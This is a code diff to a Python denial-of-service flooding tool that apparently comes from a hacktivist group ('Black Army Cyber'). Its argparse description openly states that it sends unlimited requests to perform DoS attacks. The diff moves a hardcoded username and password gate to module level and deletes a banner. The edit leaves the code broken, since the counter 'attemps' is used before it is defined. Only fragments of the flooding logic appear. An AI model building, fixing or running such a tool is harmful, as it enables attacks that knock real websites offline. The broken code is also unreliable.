@@ -24,6 +24,18 @@ logo = """
 											╚═══╝"""
 faded_text = fade.fire(logo)
 print(faded_text)
+while attemps < 100:
+        username = input("\033[32m┏> Enter your username: \033[0m")
+        password = input("\033[32m┗> Enter your password: \033[0m")
+
+        if username == 'ba313' and password == 'ba313':
+            print("\033[48;5;3m•••⟩⟩ R U A N G  P E J U A N G ...!!\033[0m")
+            break
+        else:
+            print('Incorrect credentials. Check if you have Caps lock on and try again.')
+            attemps += 1
+            continue
+			
 host=''
 headers_useragents=[]
 request_counter=0
@@ -126,29 +138,7 @@ class SendPOSTThread(threading.Thread):
 		except:
 			pass
 
-
-# TODO:
 # check if the site stop responding and alert
-attemps = 0
-def main():
-    # Print header when tool runs
-    print(f"\033[94m╔{'═' * 55}╗")
-    print(f"\033[94m║\033[48;5;1m\033[97m  Design: Kunfayz namaku{' ' * 30} \033[0m\033[94m║")
-    print(f"\033[94m║\033[48;5;1m\033[97m  Black Army Cyber grupe{' ' * 30} \033[0m\033[94m║")
-    print(f"\033[94m╚{'═' * 55}╝")
-
-    while attemps < 100:
-        username = input("\033[32m┏> Enter your username: \033[0m")
-        password = input("\033[32m┗> Enter your password: \033[0m")
-
-        if username == 'ba313' and password == 'ba313':
-            print("\033[48;5;3m•••⟩⟩ R U A N G  P E J U A N G ...!!\033[0m")
-            break
-        else:
-            print('Incorrect credentials. Check if you have Caps lock on and try again.')
-            attemps += 1
-            continue
-
 def main(argv):
 	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. by: TweenLion')
 	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
